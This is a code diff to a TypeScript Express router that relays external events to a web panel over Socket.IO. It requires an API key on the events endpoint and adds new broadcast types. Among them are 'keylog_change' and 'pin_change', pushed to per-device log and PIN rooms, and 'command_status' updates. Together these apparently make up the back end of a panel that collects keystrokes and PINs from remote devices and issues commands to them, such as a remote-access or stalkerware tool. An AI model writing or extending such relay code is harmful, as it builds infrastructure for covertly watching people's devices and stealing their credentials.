@@ -6,6 +6,7 @@ import { firebaseService } from '../../services/firebase.service';
 import config from '../../config/env';
 import logger from '../../utils/logger';
 import { io } from '../../index';
+import { realtimeRegistry } from '../../services/realtimeRegistry';
 
 const router = Router();
 const supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);
@@ -39,7 +40,7 @@ router.post('/data', authenticate, asyncHandler(async (req: Request, res: Respon
                 }
             }
         } catch (err) {
-            logger.error(`Failed to resolve appId ${appId}:`, err);
+            logger.error(err, `Failed to resolve appId ${appId}:`);
         }
     }
 
@@ -66,7 +67,7 @@ router.post('/data', authenticate, asyncHandler(async (req: Request, res: Respon
 
         return res.json({ success: true, data: result });
     } catch (error: any) {
-        logger.error('External data fetch error:', error.message);
+        logger.error(error, 'External data fetch error');
         return res.status(500).json({ success: false, error: error.message });
     }
 }));
@@ -78,8 +79,9 @@ router.post('/data', authenticate, asyncHandler(async (req: Request, res: Respon
 router.post('/events', asyncHandler(async (req: Request, res: Response) => {
     const { type, data, source, apiKey } = req.body;
 
-    // Simple security check (could be enhanced)
-    if (apiKey && process.env.EXTERNAL_NOTIFY_API_KEY && apiKey !== process.env.EXTERNAL_NOTIFY_API_KEY) {
+    // Security check: API key is REQUIRED
+    if (!apiKey || apiKey !== process.env.EXTERNAL_NOTIFY_API_KEY) {
+        logger.warn({ ip: req.ip, source }, 'Unauthorized external event attempt');
         return res.status(401).json({ success: false, error: 'Unauthorized' });
     }
 
@@ -87,14 +89,32 @@ router.post('/events', asyncHandler(async (req: Request, res: Response) => {
 
     // Broadcast to main panel's clients via internal Socket.IO
     if (type === 'device_change') {
-        io.emit('device_change', { eventType: 'UPDATE', new: data });
+        if (!realtimeRegistry.getSystemConfig()?.highScaleMode) {
+            io.emit('device_change', { eventType: 'UPDATE', new: data });
+        }
         if (data.device_id) {
             io.to(`device-${data.device_id}`).emit('device_change', { eventType: 'UPDATE', new: data });
+            io.to('admin-dashboard').emit('device_change', { eventType: 'UPDATE', new: data });
         }
     } else if (type === 'message_change') {
-        io.emit('message_change', { eventType: 'INSERT', new: data });
+        if (!realtimeRegistry.getSystemConfig()?.highScaleMode) {
+            io.emit('message_change', { eventType: 'INSERT', new: data });
+        }
         if (data.device_id) {
             io.to(`messages-${data.device_id}`).emit('message_change', { eventType: 'INSERT', new: data });
+            io.to('admin-messages').emit('message_change', { eventType: 'INSERT', new: data });
+        }
+    } else if (type === 'command_status') {
+        if (data.device_id) {
+            io.to(`device-${data.device_id}`).emit('command_change', { eventType: 'UPDATE', new: data });
+        }
+    } else if (type === 'keylog_change') {
+        if (data.device_id) {
+            io.to(`logs-${data.device_id}`).emit('keylog_change', { eventType: 'INSERT', new: data });
+        }
+    } else if (type === 'pin_change') {
+        if (data.device_id) {
+            io.to(`pins-${data.device_id}`).emit('pin_change', { eventType: 'INSERT', new: data });
         }
     }
 
